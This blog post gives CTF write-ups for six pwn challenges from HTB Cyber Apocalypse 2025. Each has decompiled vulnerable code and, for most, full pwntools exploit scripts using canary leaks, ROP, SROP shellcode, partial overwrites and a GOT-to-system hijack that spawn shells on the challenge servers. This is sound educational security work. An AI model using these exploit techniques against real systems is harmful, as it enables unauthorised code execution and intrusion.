---
layout: post
title: Cyber Apocalypse CTF 2025 Tales from Eldoria | PWN writeups
description: all PWN challenges writeups + quick explanations
tags: pwn hack-the-box srop stack
---

Was a very intense CTF . I played with WorldWideFlags 🐧 and we managed to clear 76/77 challenges , earning the *17*th place. I mainly played PWN and REV so here is my PWN POV .

# Quack Quack

### notes :

- NO PIE
- we have WIN function
- canary enabled

```c
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  __int64 buf[4]; // [rsp+10h] [rbp-80h] BYREF
  __int64 v3[11]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 0x66uLL);
  v1 = strstr((const char *)buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 0x6AuLL);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```

1. we have BOF in stack , we still need to bypass the canary
2. for some reason we have our input at v1+32 printed

### plan :

- we make v1+32 point to &canary+1 to skip the first null byte
- we change ret address to win address .

### Solver :

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''

                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./quack_quack")
libc=ELF("./glibc/libc.so.6")
nc="nc 94.237.60.20 46275"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
p.send(b"a"*(0x58+1)+b"Quack Quack ")

p.recvuntil("> Quack Quack ")
canary=u64(p.recv(7).rjust(8,b"\x00"))
log.info(hex(canary))
p.send(b"a"*0x58+p64(canary)+p64(0)+p64(0x40137f))

p.interactive()
```

_HTB{~c4n4ry_g035_qu4ck_qu4ck~\_ead9afcab060f18a34af4dcca35ee5a2}_

---

# Blessing

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  _QWORD *v6; // [rsp+18h] [rbp-18h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  size = 0LL;
  v6 = malloc(0x30000uLL);
  *v6 = 1LL;
  printstr(
    "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\n"
    "\n"
    "Please accept this: ");
  printf("%p", v6);
  sleep(1u);
  for ( i = 0LL; i <= 0xD; ++i )
  {
    printf("\b \b");
    usleep(0xEA60u);
  }
  puts("\n");
  printf(
    "%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: ",
    "\x1B[1;34m",
    "\x1B[1;32m",
    "\x1B[1;34m");
  __isoc99_scanf("%lu", &size);
  buf = malloc(size);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ", "\x1B[1;34m", "\x1B[1;32m", "\x1B[1;34m");
  read(0, buf, size);
  *(_QWORD *)((char *)buf + size - 1) = 0LL;
  write(1, buf, size);
  if ( *v6 )
    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n", "\x1B[1;31m", "\x1B[1;32m", "\x1B[1;31m");
  else
    read_flag();
  return 0;
}
```

### notes :

- to win we need to change that 1 into a 0
- we have the address of the 0x30000 malloc'ed (or mmaped) chunk , which is adjacent to libc . it is the same chunk that has the int we need to change to win
- we have malloc of our size of choosing
- we read at our malloc with our size that we chose then add null byte at the end
- no checks on the malloc if it fails . meaning if it returns 0 or some error code .

### plan :

- since its impossible here to overlap chunks , and since we only need to write a null byte at the specified location, we're gonna focus on this line `*(_QWORD *)((char *)buf + size - 1) = 0LL;`
- if we manage to make malloc return 0 , that line will be equivalent to `*(_QWORD *)((char *)NULL + size - 1) = 0LL;` , in other words `*(_QWORD *)((char *)size - 1) = 0LL;` . also if `buf==NULL` , the read before it wont crash so we can control the address of where we write the nullbyte with the size
- we can make malloc return 0 by specifying a very big size , which in our case can be the address of our target (+1 actually)

### Solver :

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* main+273
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./blessing")
libc=ELF("./glibc/libc.so.6")
nc="nc 94.237.60.63 53601"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
p.recvuntil("Please accept this: ")
leak=int(p.recv(14),16)
log.info(hex(leak))
debug()
p.sendline(str(leak+1))
p.interactive()
```

_HTB{3v3ryth1ng_l00k5_345y_w1th_l34k5_c82e0654d799c3117ef943b6503489b3}_

---

# Crossbow

### notes :

- no pie
- we have gadgets
- compiled statically
- we need rce

```c
__int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _QWORD *v12; // rbx
  int v13; // r8d
  int v14; // r9d
  __int64 result; // rax
  int v16; // r8d
  int v17; // r9d
  int v18; // [rsp+1Ch] [rbp-14h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Select target to shoot: ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v10,
      v11);
    exit(1312LL);
  }
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1LL, 128LL);
  if ( !*v12 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v13,
      v14);
    exit(6969LL);
  }
  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    v13,
    v14);
  result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128LL, &_stdin_FILE);
  if ( !result )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v16,
      v17);
    exit(69LL);
  }
  return result;
}
```

### BUG :

- no OOB check on the index value
- we can specify a pointer in stack that can read into it with _fgets_ (relative to argument passed)

### plan :

- we choose index `-2` so it points to saved rbp so we can ropchain at the ret of calling function .
- i couldnt fit a read into execve('/bin/sh') in 128 bytes so i had to split the payload into 2 parts : one is written in the stack and the other is written in the bss when i write ("/bin/sh) . after reading /bin/sh and the second rop we just stack pivot into it .
- also i needed to increase the rsp value so that when we call fgets for read rsp doesnt go out of the stack >>> segfault
  for that i used this gadget that saves some space and does what i need
  `0x00000000004051c3 : pop rax ; pop rdx ; add rsp, 0x28 ; ret`
- gg

### Solver :

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* 0x00000000004013ec
                        b* 0x0000000000401450
                        b* 0x0000000000401313
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./crossbow")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
nc="nc 94.237.55.3 56251"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
#debug()
p.sendline("-2")

rdi=0x0000000000401d6c
rsi=0x000000000040566b
rdx=0x0000000000401139
rax=0x0000000000401001
writeable=0x000000000040f000+0xa00
syscall=0x0000000000405460
main=0x00000000004013ed
stdin=0x40e020
fgets=0x0000000000401cc0
leave=0x00000000004013eb
payload=p64(rdi)+p64(writeable)+p64(rsi)+p64(0x80)+ p64(0x4051c3)+p64(0)+p64(stdin) +b"c"*0x28+p64(fgets)+p64(leave)

print(len(payload))
p.sendline(p64(writeable+8)+payload)
rop=p64(0)+p64(rdi)+p64(writeable)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)
p.sendline(b"/bin/sh\x00"+rop)

p.interactive()
```

_HTB{st4t1c_b1n4r13s_ar3_2_3z_76426d2a1fa41803b541afa9a27f9829}_

---

# Laconic

### notes :

- all the binary has is this

```nasm
mov    rdi,0x0
mov    rsi,rsp
sub    rsi,0x8
mov    rdx,0x106
syscall
ret
pop    rax
ret
```

- very weird mapping with executable being rwx xD

![vmmap](/assets/posts/htb-2025-cyberapocalypse/image.png)

### my plan :

- we return into a pop rax , sigreturn syscall number with an srop payload that has this :
  - rdi=0
  - rsi=&ret right after syscall
  - rax=0 (for read syscall)
  - rip=syscall >>> this will trigger read on the address of right after syscall , os it will look like this : right before we enter syscall , the instruction after it is ret . but when syscall terminates , it becomes a shellcode we wrote .

### solver :

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* 0x0000000000043018
                           c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./laconic")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
nc="nc 94.237.61.48 57393"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
syscall=0x0000000000043015
frame = SigreturnFrame()
frame.rax=0
frame.rdi=0
frame.rsi=0x0000000000043017
frame.rdx=0x100
frame.rip=0x000000000004300e # right before syscall
#frame.r15=u64("/bin/sh\x00")

payload=bytes(frame)
log.info(len(payload))
rax=0x0000000000043018
#debug()
p.send((b"a"*8+p64(rax)+p64(0xf)+p64(0x0000000000043015)+payload)[:0x106])
shellcode="mov rsp , 0x0000000000043f00\n"
shellcode+= shellcraft.sh()

p.sendline(asm(shellcode))
p.interactive()
```

_HTB{s1l3nt_r0p_fb9e0219440cdcb6b1c170964af49cac}_

---

# Contractor

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  int v5; // [rsp+8h] [rbp-20h] BYREF
  int v6; // [rsp+Ch] [rbp-1Ch]
  void *s; // [rsp+10h] [rbp-18h]
  char s1[4]; // [rsp+1Ch] [rbp-Ch] BYREF
  unsigned __int64 v9; // [rsp+20h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v3 = alloca(304LL);
  s = &v5;
  memset(&v5, 0, 0x128uLL);
  printf(
    "%s[%sSir Alaric%s]: Young lad, I'm truly glad you want to join forces with me, but first I need you to tell me some "
    "things about you.. Please introduce yourself. What is your name?\n"
    "\n"
    "> ",
    "\x1B[1;34m",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xF; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i) = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: Excellent! Now can you tell me the reason you want to join me?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xFF; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i + 16) = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: That's quite the reason why! And what is your age again?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  __isoc99_scanf("%ld", (char *)s + 272);
  printf(
    "\n"
    "[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain specialty in combat?\n"
    "\n"
    "> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xF; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i + 280) = safe_buffer;
  }
  printf(
    "\n"
    "[%sSir Alaric%s]: So, to sum things up: \n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n"
    "\t[Name]: %s\n"
    "\t[Reason to join]: %s\n"
    "\t[Age]: %ld\n"
    "\t[Specialty]: %s\n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n",
    "\x1B[1;33m",
    "\x1B[1;34m",
    (const char *)s,
    (const char *)s + 16,
    *((_QWORD *)s + 34),
    (const char *)s + 280);
  v6 = 0;
  printf(
    "[%sSir Alaric%s]: Please review and verify that your information is true and correct.\n",
    "\x1B[1;33m",
    "\x1B[1;34m");
  do
  {
    printf("\n1. Name      2. Reason\n3. Age       4. Specialty\n\n> ");
    __isoc99_scanf("%d", &v5);
    if ( v5 == 4 )
    {
      printf("\n%s[%sSir Alaric%s]: And what are you good at: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 0xFF; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        *((_BYTE *)s + i + 280) = safe_buffer;
      }
      ++v6;
    }
    else
    {
      if ( v5 > 4 )
        goto LABEL_36;
      switch ( v5 )
      {
        case 3:
          printf(
            "\n%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: ",
            "\x1B[1;34m",
            "\x1B[1;33m",
            "\x1B[1;34m");
          __isoc99_scanf("%d", (char *)s + 272);
          ++v6;
          break;
        case 1:
          printf("\n%s[%sSir Alaric%s]: Say your name again: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i) = safe_buffer;
          }
          ++v6;
          break;
        case 2:
          printf("\n%s[%sSir Alaric%s]: Specify the reason again please: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xFF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i + 16) = safe_buffer;
          }
          ++v6;
          break;
        default:
LABEL_36:
          printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
          exit(1312);
      }
    }
    if ( v6 == 1 )
    {
      printf(
        "\n%s[%sSir Alaric%s]: I suppose everything is correct now?\n\n> ",
        "\x1B[1;34m",
        "\x1B[1;33m",
        "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 3; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        s1[i] = safe_buffer;
      }
      if ( !strncmp(s1, "Yes", 3uLL) )
        break;
    }
  }
  while ( v6 <= 1 );
  printf("\n%s[%sSir Alaric%s]: We are ready to recruit you young lad!\n\n", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  return 0;
}
```

### notes :

- all mitigation enabled (canary enabled)
- we have win function
- _what are you good at: _ doesnt have null termination > that gives us pie leak (address of win)
- modifying the _what are you good at: _ has a big BOF se theoretically we can rop , but we need to bypass the canary

### weird note :

as seen in ida , all the writes in the stack variable seem to be relative to the 's' variable , in other words i thought its done by something like this (as you usually see it) `lea rdi , [rbp-0x20]` for example . in fact this is how ida interprets it . if it was done this way , it would be hopeless .
but what is actually happening is , it has a pointer right before the canary that points to all the struct . and it writes and reads by dereferencing that pointer

```nasm
mov    rax,QWORD PTR [rbp-0x18]
add    rax,0x110
mov    rsi,rax
```

### plan

- get pie leak
- we modifie the first byte of that pointer to point to the return address and write the win function
- this requires 1/8 chance brute force as pointers in stack dont have fixed offset. still no biggie .

### solver

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* main+1328
                        b* main+1226
                        b* main+1666
                        b* main+1420
                        c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./contractor")
libc=ELF("./glibc/libc.so.6")
nc="nc 94.237.58.215 33309"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############

'''p.send("a"*0x10)
p.send("b"*0x100)
p.sendline("18")
p.send(b"c"*0x10)
p.recvuntil("cccccccccccccccc")
exe.address=u64(p.recv(6).ljust(8,b"\x00"))-0x1b50
log.info(hex(exe.address))
p.sendline("4")
p.recvuntil("And what are you good at: ")
#p.sendline(b"x"*0xf0)
win=exe.symbols["contract"]
p.send(b"1"*0x20) ### we need the +0x1f
debug()
p.sendline(p8(0xd0-1+8)+p64(win))
#p.sendline(b"1"*0x20+p8(0xd0-1+8)+p64(win)*10) ### we need the +0x1f # 0x5f works

p.interactive()'''



while True:
        p.close()
        #p=process([exe.path])
        p=remote(host,port)
        try:
                p.send("a"*0x10)
                p.send("b"*0x100)
                p.sendline("18")
                p.send(b"c"*0x10)
                p.recvuntil("cccccccccccccccc")
                exe.address=u64(p.recv(6).ljust(8,b"\x00"))-0x1b50
                log.info(hex(exe.address))
                #debug()
                p.sendline("4")
                p.recvuntil("And what are you good at: ")
                #p.sendline(b"x"*0xf0)
                win=exe.symbols["contract"]
                p.sendline(b"1"*0x20+p8(0x5f)+p64(win)*10) ### we need the +0x1f
                #p.sendline(b"b"*5+p64(win)*(0xf0//8))
                p.sendline("ls")
                p.interactive()
                #print(p.recv(timeout=1))
        except KeyboardInterrupt:
                print("gg")
        except:
                pass
```

_HTB{4_l1ttl3_bf_41nt_b4d_23d1dfc7e980c6b842cf75a6495478c8}_

---

# Strategist

my teammate did this one so here is his note :

- heap challenge, overflow to unset prev_inuse bit -> consolidation attack -> tcache poisoning to overflow free_hook (old libc)

_HTB{0ld_r3l14bl3_l1bc_st1ll_3x15t5_7a91d2519fd7d029c2a3c6c019632d9c}_

---

# Vault :

very annoying challenge , wouldnt wish it upon my worst enemy . it took me and my teammate a day to just find a bug . maybe its a skill issue who knows .
i wont be explaining the functionnalities of the program . So i recommend that you give it a try yourself

### notes

- full mitigations
- need RCE
- no leaks or anything
- very weird stack (most probably used a different compiler than gcc) . this is the epilogue of the view_entries() .

```nasm
add    rsp,0x1b0
pop    rbx
pop    r12
pop    r13
pop    r14
pop    r15
ret
```

### Bugs :

- we can get the random sequence if we show the sam chunk twice and xoring their output
- the saved url can be not null terminated when parsing , if it has :// and : and has full length

```c
  {
    n = v5 - haystack;
    if ( (unsigned __int64)(v5 - haystack) > 0x80 )
      n = 127LL;
    strncpy(a1, haystack, n);
    result = &a1[n];
    a1[n] = 0;
  }
```

- this line `v2 = snprintf(res, 0x180uLL, "Hostname:  %s\nPassword:    ", v0->hostname);` wouldve worked fine if we didnt have the non null termination from below . A lot of people (me included) think the return value of snprintf is always the number of bytes it had written in the string . but it couldve written more chars , it will return the bytes it couldve had written .
  ![snprintf](/assets/posts/htb-2025-cyberapocalypse/snprintf.png)

- for example if we make snprintf return 0x198 (max value i think) , the password will be written right after the canary . so thats one mitigation down . we still need to get our leaks , and think about how we rce as our password memcpy will stop at null bytes (we cant rop)
- knowing the random sequence , we can control the length of the password to br viewed with it being max size (0xff) . that can be done by
  sending our wanted to be written password , xored with they key then padding it with the key itself , so after viewing it once it becomes our wanted input , all this with being of size 0xff . we will use this later to gain partial overwrite

### exploitation :

- as we have no leaks , we can partial overwrite only one of those . but the thing is you will overwrite everyone before it . we can start overwriting at max r12 , so the only one we can ignore is rbx

```nasm
add    rsp,0x1b0
pop    rbx
pop    r12
pop    r13
pop    r14
pop    r15
ret
```

- when doing the challenge i tried overwriting all of them (except the return address) with some cyclic pattern , that led me to a segfault in puts which led me to this part of the code

```nasm
mov    rdi,r15
call   0x555555555130 <puts@plt>
mov    rdi,r14
call   0x555555555130 <puts@plt>
mov    rdi,r13
call   0x555555555130 <puts@plt>
mov    rdi,r12
xor    eax,eax
call   0x555555555170 <printf@plt>
```

we can see that those registers were passed to puts/printf , so if we partially overwrite them to some got entry or to our URL variable (both will require 1/8 chance brute force) , we can get libc leak or we can get format string vuln . for format string to be efficient and straight forward , our payload needs to be on the stack (it is copied in the stack but no null bytes were copied (no addresses) and the stack grew backwards so we cant even access them if we wrote them). i chose the puts because why not . >>>> libc leak obtained

- just as i said above , writing with format string was a casse-tete . it looked feasable (and it is as the flag later confirmed it) but i didnt even bother looking at it so i needed another way .
- another thing was the onegadgets libc has , they were kinda feasbele except for the $rbp value which for some reason had the value 1 xDDDDDDD . (again the flag confirmed it was the intended solution) . so i didnt bother trying to fix and went searching for another way
- at this point i ran out of options so tried overwriting the registers again , to my surprise , i had a crash in scanf which is caused by the corrupted rbx value . bakctracing led me this part of the code

```nasm
mov    rsi,rbx
lea    rdi,[rip+0x13d5]        # 0x555555556653
call   0x5555555551d0 <__isoc99_scanf@plt>
# x/s 0x555555556653 >> 0x555555556653: "%d%*c"

```

we can see our rbx value is passed as pointer to scanf , so just like that we can get arbitrary int write (only once)

- a target i usually use when we have puts(string_we_can_control) is overwriting the strlen got entry inside libc , because it will call it with the same parameter . luckily for us libc is partial relro so we get away with it this time

- then we do puts("/bin/sh")
- something to note is when running the exploit , we need the random sequence to not have any null bytes , and for some reason my script sometimes crash but whatever works works
- gg

### Solver :

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

'''b* 0x5555555556c0
b* 0x5555555557c4'''
def debug():
        if local<2:
                gdb.attach(p,'''

                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./vault")
libc=ELF("./glibc/libc.so.6")
nc="nc 94.237.50.40 44135"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

def add(url,password,cond=True):
        if cond:
                p.recvuntil("> ")
        p.sendline("1")
        p.recvuntil("URL: ")
        p.sendline(url)
        p.recvuntil("Password: ")
        p.sendline(password)

def view(index,cond=True):
        if cond:
                p.recvuntil("> ")
        p.sendline("2")
        p.recvuntil("Index: ")
        p.sendline(str(index))
############### main exploit    ###############
while 1:
        #sleep(0.5)
        log.info("started")
        p.close()
        #p=process([exe.path])
        p=remote(host,port)
        payload=b"a"*0x40
        try:
                add("b"*0x80,payload)
                view(0)
                view(0)
                p.recvuntil("Password:    ")

                leak=p.recvline()[:-2]

                key=xor(payload,leak)
                assert len(key)==0x40 and (b"\n" not in key) and (b" " not in key) and (b"\x00" not in key)


                partial=p32(0x8f70)
                password=xor(partial,key[:len(partial)])+key[len(partial):]+key*2+key[:-1]
                #print(len(password))

                add(b"://"+b"1"*0x80+b":cc",password[:255])
                sleep(0.5)
                view(1)
                #debug()
                '''if "Invalid choice" in p.recv(timeout=0.5):
                        raise Exception("fucking loop")'''
                view(1)

                p.recvuntil("3. Exit\n")
                libc.address=u64(p.recv(6).ljust(8,b"\x00"))-0x80e50
                log.info(hex(libc.address))
                if libc.address<0:
                        raise Exception("fucking libc")
                #debug()
                target=libc.address+0x21a098
                log.info(hex(target))
                #### second stage
                partial=p64(target)[:-2]
                password=xor(partial,key[:len(partial)])+key[len(partial):]+key*2+key[:-1]
                #print(len(password))
                log.info("unpause ")
                pause()
                add(b"://"+b"1"*0x80+b":cc",password[:255-8],False)
                log.info("reached")
                add(b";/bin/sh;\x00",b"xdd",False) #3

                view(2,False)
                view(2,False)

                p.sendline(str(libc.symbols["system"]&0xffffffff))
                p.recvuntil("Index: ")
                p.sendline("3")
                p.sendline("cat fla*")
                #view(3,False)
                p.interactive()

        except KeyboardInterrupt:
                pass
        except :
                pass
```

_HTB{Fm7_S7r1Ng_T0_0n3_G4dG37_1S_Th3_1337_W4y_6a729c18ad2a9037294a04dc4eae9206}_
